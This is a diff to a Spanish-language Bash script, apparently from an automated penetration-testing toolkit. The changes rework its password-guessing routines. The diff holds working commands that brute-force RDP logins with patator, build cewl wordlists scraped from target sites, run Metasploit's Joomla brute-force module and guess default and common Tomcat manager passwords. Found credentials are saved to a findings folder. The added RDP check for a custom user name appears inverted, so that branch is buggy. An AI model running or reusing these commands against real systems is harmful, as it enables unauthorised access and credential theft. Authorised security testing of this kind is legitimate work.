@@ -166,47 +166,31 @@ if [ -f servicios/rdp.txt ]; then
 		port=`echo $line | cut -f2 -d":"`
 		echo -e "\n\t $OKBLUE Encontre servicios de RDP expuestos en $ip:$port $RESET"	  
 		
+		####### user administrator ####
+		patator.py rdp_login host=$ip user=administrator password=FILE0 0=top.txt -x quit:egrep='OK|PASSWORD_EXPIRED' 2> logs/cracking/"$ip"_rdp_passwordAdivinadoWin.txt
+		egrep -iq  "\| ERRCONNECT_PASSWORD_EXPIRED|\| OK" logs/cracking/"$ip"_rdp_passwordAdivinadoWin.txt
+		greprc=$?
+		if [[ $greprc -eq 0 ]] ; then	
+			echo -e "\t$OKRED[!] Password found \n $RESET"
+			creds=`egrep  "\| ERRCONNECT_PASSWORD_EXPIRED|\| OK"  logs/cracking/"$ip"_rdp_passwordAdivinadoWin.txt | awk '{print $9}'`
+			echo "administrator:$creds" >> .vulnerabilidades/"$ip"_rdp_passwordAdivinadoWin.txt
+		fi	
+		##############################
 
-		# user = "nombre entidad"
-		# patator.py rdp_login host=$ip user=$ENTIDAD password=FILE0 0=top.txt -l logs/cracking/rdp2 
-		# logFile=`grep OK logs/cracking/rdp2/* | head -1| cut -d ":" -f1`		
-
-		# if [ -z "$logFile" ]; then
-		# 	echo "Upps no se encontro passwords"
-		# else
-		# 	egrep -iq "OK" $logFile 
-		# 	greprc=$?
-		# 	if [[ $greprc -eq 0 ]] ; then			
-		# 		echo -e "\t[i] Password encontrado"
-		# 		# 14:36:32 patator.py    INFO - 0     2      1.942 | Cndc2021                           |   123 | OK
-		# 		password=`head -1 $logFile | cut -d " " -f 4 | cut -d : -f2`
-		# 		cp $logFile logs/cracking/"$ip"_"$port"_rdpPass.txt #2>/dev/null
-		# 		echo "$line (Usuario:$ENTIDAD Password:$password)" >> .vulnerabilidades/"$ip"_"$port"_rdpPass.txt								
-				
-		# 	fi
-		# fi
-		
-		
-
-		# user = administrator
-		mkdir -p logs/cracking/rdp3/$ip
-		patator.py rdp_login host=$ip user=administrator password=FILE0 0=top.txt  -l logs/cracking/rdp3/$ip 2>/dev/null
-		logFile=`grep OK logs/cracking/rdp3/$ip/* | head -1| cut -d ":" -f1`				
-		if [ -z "$logFile" ]; then
-			echo "Upps no se encontro passwords"
-		else
-
-			egrep -iq "OK" $logFile
+		if [ -z "$ENTIDAD" ]
+		then
+			####### user $ENTIDAD ####
+			patator.py rdp_login host=$ip user=$ENTIDAD password=FILE0 0=top.txt -x quit:egrep='OK|PASSWORD_EXPIRED' 2>> logs/cracking/"$ip"_rdp_passwordAdivinadoWin.txt
+			egrep -iq  "\| ERRCONNECT_PASSWORD_EXPIRED|\| OK" logs/cracking/"$ip"_rdp_passwordAdivinadoWin.txt
 			greprc=$?
-			if [[ $greprc -eq 0 ]] ; then			
-				echo -e "\t[i] Password encontrado"
-				# 14:36:32 patator.py    INFO - 0     2      1.942 | Cndc2021                           |   123 | OK
-				password=`head -1 $logFile | cut -d " " -f 4 | cut -d : -f2`
-				echo "$line (Usuario:administrator Password:$password)" >> .vulnerabilidades/"$ip"_"$port"_rdpPass.txt								
-				cp $logFile logs/cracking/"$ip"_"$port"_rdpPass.txt 2>/dev/null
-			fi
+			if [[ $greprc -eq 0 ]] ; then	
+				echo -e "\t$OKRED[!] Password found \n $RESET"
+				creds=`egrep  "\| ERRCONNECT_PASSWORD_EXPIRED|\| OK"  logs/cracking/"$ip"_rdp_passwordAdivinadoWin.txt | awk '{print $9}'`
+				echo "$ENTIDAD:$creds" >> .vulnerabilidades/"$ip"_rdp_passwordAdivinadoWin.txt
+			fi	
+			##############################
 		fi
-		#rm logs/cracking/rdp3/* # borrar logs									
+
 	 done	
 	 insert_data
 
@@ -237,14 +221,15 @@ then
 		echo -e "\n\t########### $ip_port #######"
 				
 		echo -e "\n\t########### extract passwords from $proto_ip_port #######"
-		cewl -w cewl-passwords.txt -e -a $proto_ip_port
-		cat top.txt cewl-passwords.txt | sort | uniq > top-web.txt
+		
 
 #			echo "webData.pl -t $ip -d $path -p $port -e todo -l /dev/null -r 4 "			
 		echo ""
 		if [[ $fingerprint = *"wordpress"* ]]; then
 			echo -e "\t[+] Wordpress identificado en $ip:$port"
-			echo -e "\t[+] Probando contraseñas comunes ...."				
+			echo -e "\t[+] Probando contraseñas comunes ...."	
+			cewl -w cewl-passwords.txt -e -a $proto_ip_port
+			cat top.txt cewl-passwords.txt | sort | uniq > top-web.txt			
 			# 
 			if [ -f ".vulnerabilidades2/"$ip"_"$port"_wpUsers.txt" ]; then
 				#https://181.115.188.36:443/				
@@ -331,39 +316,39 @@ then
 		if [[ $fingerprint = *"joomla"* ]]; then
 			echo -e "\t[+] Joomla identificado"
 			echo -e "\t[+] Probando contraseñas comunes ...."
+			cewl -w cewl-passwords.txt -e -a $proto_ip_port
+			cat top.txt cewl-passwords.txt | sort | uniq > top-web.txt
 			echo "admin" > username.txt
-			echo "msfconsole -x \"use auxiliary/scanner/http/joomla_bruteforce_login;set USER_FILE username.txt;set USERPASS_FILE '';set RHOSTS $ip;set AUTH_URI /$path/index.php;set PASS_FILE top.txt;set RPORT $port; set USERNAME admin; set STOP_ON_SUCCESS true;run;exit\"" > logs/cracking/"$ip"_"$port"_joomla.txt
-			msfconsole -x "use auxiliary/scanner/http/joomla_bruteforce_login;set USER_FILE username.txt;set USERPASS_FILE '';set RHOSTS $ip;set AUTH_URI /$path/index.php;set PASS_FILE top.txt;set RPORT $port; set USERNAME admin; set STOP_ON_SUCCESS true;run;exit" >> logs/cracking/"$ip"_"$port"_joomla.txt 2>/dev/null
+			echo "msfconsole -x \"use auxiliary/scanner/http/joomla_bruteforce_login;set USER_FILE username.txt;set USERPASS_FILE '';set RHOSTS $ip;set AUTH_URI /$path/index.php;set PASS_FILE top-web.txt;set RPORT $port; set USERNAME admin; set STOP_ON_SUCCESS true;run;exit\"" > logs/cracking/"$ip"_"$port"_joomla.txt
+			msfconsole -x "use auxiliary/scanner/http/joomla_bruteforce_login;set USER_FILE username.txt;set USERPASS_FILE '';set RHOSTS $ip;set AUTH_URI /$path/index.php;set PASS_FILE top-web.txt;set RPORT $port; set USERNAME admin; set STOP_ON_SUCCESS true;run;exit" >> logs/cracking/"$ip"_"$port"_joomla.txt 2>/dev/null
 			grep --color=never 'Successful login' logs/cracking/"$ip"_"$port"_joomla.txt | sort | uniq > .vulnerabilidades/"$ip"_"$port"_joomla.txt 
 			rm username.txt
 					
 		fi	
 					
 		if [[ $fingerprint = *"tomcat"* ]]; then
-			echo -e "\t[+] Tomcat identificado"							
-			echo "patator.py http_fuzz url=$ip_port_path user_pass=COMBO00:COMBO01 0=$tomcat_passwrods_combo >> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt 2>> logs/cracking/"$ip"_tomcat_passwordAdivinadoServ.txt	" > logs/cracking/"$ip"_tomcat_passwordAdivinadoServ.txt 
-
+			echo -e "\t[+] Tomcat identificado ($ip_port_path)"										
 			echo -e "\t\t[+] Testing common passwords"	
-			echo "patator.py http_fuzz url=$ip_port_path user_pass=COMBO00:COMBO01 0=$tomcat_passwrods_combo" > logs/cracking/"$ip"_tomcat_passwordAdivinadoServ.txt
-			patator.py http_fuzz url=$ip_port_path user_pass=COMBO00:COMBO01 0=$tomcat_passwrods_combo >> logs/cracking/"$ip"_tomcat_passwordAdivinadoServ.txt 2 >> logs/cracking/"$ip"_tomcat_passwordAdivinadoServ.txt
-			egrep -iq "200 OK" logs/cracking/"$ip"_tomcat_passwordAdivinadoServ.txt
+			#echo "patator.py http_fuzz url=$ip_port_path user_pass=COMBO00:COMBO01 0=$tomcat_passwrods_combo" 
+			patator.py http_fuzz url=$ip_port_path user_pass=COMBO00:COMBO01 0=$tomcat_passwrods_combo >> logs/cracking/"$ip"_tomcat_passwordDefecto.txt 2>> logs/cracking/"$ip"_tomcat_passwordDefecto.txt
+			egrep -iq "INFO - 200" logs/cracking/"$ip"_tomcat_passwordDefecto.txt
 			greprc=$?
 			if [[ $greprc -eq 0 ]] ; then			
-				echo -e "\t[i] Password encontrado"
-				# 12:56:35 patator.py    INFO - 200  16179:-1       0.005 | tomcat                             |   133 | HTTP/1.1 200 OK
-				#password=`grep --color=never "200 OK" logs/cracking/"$ip"_"$port"_passTomcat.txt | cut -d "|" -f 2 | tr -d ' '`										
-				echo "[Tomcat] $ip_port_path (Usuario:xxx Password:xxx)" > .vulnerabilidades/"$ip"_tomcat_passwordAdivinadoServ.txt								
+				echo -e "\t\t[i] Password encontrado"				
+				# 09:55:46 patator    INFO - 200  22077:-1       0.522 | tomcat:s3cret                      |    25 | HTTP/1.1 200
+				creds=`grep --color=never "INFO - 200" logs/cracking/"$ip"_tomcat_passwordDefecto.txt | cut -d "|" -f 2 | tr -d ' '`
+				echo "$ip_port_path (Creds $creds)" > .vulnerabilidades/"$ip"_tomcat_passwordDefecto.txt
 			else
 				echo -e "\t\t[+] Bruteforcing passwords (user=tomcat)"	
-				echo "patator.py http_fuzz method=GET url=$line user_pass=tomcat:FILE0 0=top.txt -e user_pass:b64 --threads=3" >> logs/cracking/"$ip"_tomcat_passwordAdivinadoServ.txt 				
-				patator.py http_fuzz method=GET url=$line user_pass=tomcat:FILE0 0=top.txt -e user_pass:b64 --threads=3 > logs/cracking/"$ip"_tomcat_passwordAdivinadoServ.txt 2>> logs/cracking/"$ip"_tomcat_passwordAdivinadoServ.txt			
-				egrep -iq "200 OK" logs/cracking/"$ip"_tomcat_passwordAdivinadoServ.txt
+				#echo "patator.py http_fuzz method=GET url=$ip_port_path user_pass=tomcat:FILE0 0=top.txt -e user_pass:b64 --threads=3" >> logs/cracking/"$ip"_tomcat_passwordAdivinadoServ.txt 				
+				patator.py http_fuzz method=GET url=$ip_port_path user_pass=tomcat:FILE0 0=top.txt -e user_pass:b64 --threads=3 > logs/cracking/"$ip"_tomcat_passwordAdivinadoServ.txt 2>> logs/cracking/"$ip"_tomcat_passwordAdivinadoServ.txt			
+				egrep -iq "INFO - 200" logs/cracking/"$ip"_tomcat_passwordAdivinadoServ.txt
 				greprc=$?
 				if [[ $greprc -eq 0 ]] ; then			
-					echo -e "\t[i] Password encontrado"
+					echo -e "\t\t[i] Password encontrado"
 					# 12:56:35 patator.py    INFO - 200  16179:-1       0.005 | tomcat                             |   133 | HTTP/1.1 200 OK
-					password=`grep --color=never "200 OK" logs/cracking/"$ip"_"$port"_passTomcat.txt | cut -d "|" -f 2 | tr -d ' '`
-					echo "$line (Usuario:admin Password:$password)" > .vulnerabilidades/"$ip"_"$port"_passTomcat.txt								
+					password=`grep --color=never "INFO - 200" logs/cracking/"$ip"_tomcat_passwordAdivinadoServ.txt | cut -d "|" -f 2 | tr -d ' '`
+					echo "$ip_port_path (Usuario:tomcat Password:$password)" > .vulnerabilidades/"$ip"_tomcat_passwordAdivinadoServ.txt
 				fi
 			fi
 			
